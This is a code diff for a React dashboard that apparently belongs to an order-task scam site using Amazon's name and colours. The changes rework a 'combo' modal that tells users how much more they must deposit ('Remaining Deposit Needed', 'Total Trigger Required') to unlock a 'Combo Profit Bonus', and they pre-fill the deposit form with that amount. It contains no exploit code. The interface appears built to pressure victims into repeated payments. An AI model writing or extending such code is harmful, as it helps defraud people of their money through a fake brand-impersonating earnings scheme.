-                <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
-                  <span className="text-gray-655 font-bold">Your Available Balance:</span>
-                  <span className="font-mono font-black text-gray-900">${comboModalDetails.currentBalance.toFixed(2)}</span>
-                </div>
-                {/* Top-up details */}
-                <div className="flex justify-between items-center pt-1 font-bold">
-                  <span className="text-red-750 font-black">Required Deposit Amount:</span>
-                  <span className="font-mono font-extrabold text-red-650 text-sm font-black">${comboModalDetails.triggerBalance.toFixed(2)}</span>
-                </div>
-              </div>
+              {(() => {
+                const remNeeded = comboModalDetails.remainingAmount !== undefined && comboModalDetails.remainingAmount > 0
+                  ? comboModalDetails.remainingAmount
+                  : comboModalDetails.triggerBalance;
+                const depSoFar = comboModalDetails.depositedAmount || 0;
+
+                return (
+                  <div className="bg-amber-50/70 border border-amber-200 rounded-xl p-4 space-y-3 text-xs">
+                    {/* Top: Position / Product Details */}
+                    <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                      <span className="text-gray-655 font-bold">Combo Target:</span>
+                      <span className="font-mono font-black text-gray-900 uppercase">Order #{comboModalDetails.position}</span>
+                    </div>
+                    {/* Trigger Required */}
+                    <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                      <span className="text-gray-655 font-bold">Total Trigger Required:</span>
+                      <span className="font-mono font-bold text-gray-800">${comboModalDetails.triggerBalance.toFixed(2)} USD</span>
+                    </div>
+                    {/* Deposited So Far */}
+                    {depSoFar > 0 && (
+                      <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                        <span className="text-green-700 font-bold">Approved Deposits So Far:</span>
+                        <span className="font-mono font-black text-green-700">${depSoFar.toFixed(2)} USD</span>
+                      </div>
+                    )}
+                    {/* Combo Profit */}
+                    <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                      <span className="text-gray-655 font-bold text-green-700 font-sans">Combo Profit Bonus:</span>
+                      <span className="font-mono font-black text-green-700 font-bold">+${comboModalDetails.profitAmount.toFixed(2)}</span>
+                    </div>
+                    {/* Available Balance */}
+                    <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
+                      <span className="text-gray-655 font-bold">Your Available Balance:</span>
+                      <span className="font-mono font-black text-gray-900">${comboModalDetails.currentBalance.toFixed(2)}</span>
+                    </div>
+                    {/* Remaining Deposit Needed */}
+                    <div className="flex justify-between items-center pt-1 font-bold">
+                      <span className="text-red-750 font-black">Remaining Deposit Needed:</span>
+                      <span className="font-mono font-extrabold text-red-650 text-sm font-black">${remNeeded.toFixed(2)} USD</span>
+                    </div>
+                  </div>
+                );
+              })()}
 
               <div className="mt-6 space-y-3">
                 <button
                   onClick={() => {
+                    const remNeeded = comboModalDetails.remainingAmount !== undefined && comboModalDetails.remainingAmount > 0
+                      ? comboModalDetails.remainingAmount
+                      : comboModalDetails.triggerBalance;
                     setIsComboDeposit(true);
-                    setComboDepositAmount(comboModalDetails.triggerBalance);
-                    setNewDepositAmount(comboModalDetails.triggerBalance.toString());
+                    setComboDepositMode('full'); // Default to full remaining payment mode!
+                    setComboDepositAmount(remNeeded);
+                    setNewDepositAmount(remNeeded.toString());
                     setNewDepositRemark(`Combo Payment for Position ${comboModalDetails.position}`);
                     setIsComboModalOpen(false);
                     setActiveTab('deposit');
@@ -5261,7 +5438,16 @@ export default function DashboardPage({
               initial={{ opacity: 0 }}
               animate={{ opacity: 0.6 }}
               exit={{ opacity: 0 }}
-              onClick={() => setIsComboSuccessModalOpen(false)}
+              onClick={() => {
+                if (comboSuccessDetails) {
+                  const activePlat = activePlatform || 'Amazon';
+                  const comboPos = comboSuccessDetails.position;
+                  localStorage.setItem(`combo_cleared_dismissed_${activePlat}_${comboPos}`, 'true');
+                  localStorage.setItem(`combo_cleared_dismissed_${username}_${activePlat}_${comboPos}`, 'true');
+                }
+                setIsComboSuccessModalOpen(false);
+                setActiveTab('orders');
+              }}
               className="fixed inset-0 bg-black/70 backdrop-blur-xs"
             />
 
@@ -5273,7 +5459,16 @@ export default function DashboardPage({
               className="bg-white rounded-2xl shadow-2xl border border-yellow-250 p-6 sm:p-8 max-w-md w-full z-50 relative text-left"
             >
               <button
-                onClick={() => setIsComboSuccessModalOpen(false)}
+                onClick={() => {
+                  if (comboSuccessDetails) {
+                    const activePlat = activePlatform || 'Amazon';
+                    const comboPos = comboSuccessDetails.position;
+                    localStorage.setItem(`combo_cleared_dismissed_${activePlat}_${comboPos}`, 'true');
+                    localStorage.setItem(`combo_cleared_dismissed_${username}_${activePlat}_${comboPos}`, 'true');
+                  }
+                  setIsComboSuccessModalOpen(false);
+                  setActiveTab('orders');
+                }}
                 className="absolute right-4 top-4 p-1.5 rounded-full hover:bg-gray-100 transition text-gray-500"
               >
                 <X className="h-5 w-5" />
@@ -5315,7 +5510,16 @@ export default function DashboardPage({
 
               <div className="mt-6">
                 <button
-                  onClick={() => { setIsComboSuccessModalOpen(false); setActiveTab('orders'); }}
+                  onClick={() => {
+                    if (comboSuccessDetails) {
+                      const activePlat = activePlatform || 'Amazon';
+                      const comboPos = comboSuccessDetails.position;
+                      localStorage.setItem(`combo_cleared_dismissed_${activePlat}_${comboPos}`, 'true');
+                      localStorage.setItem(`combo_cleared_dismissed_${username}_${activePlat}_${comboPos}`, 'true');
+                    }
+                    setIsComboSuccessModalOpen(false);
+                    setActiveTab('orders');
+                  }}
                   className="w-full bg-[#FF9900] hover:bg-[#e68a00] text-white font-black text-xs py-3.5 rounded-xl shadow-md transition text-center uppercase tracking-wider cursor-pointer font-sans"
                 >
                   Awesome, Let's Continue!
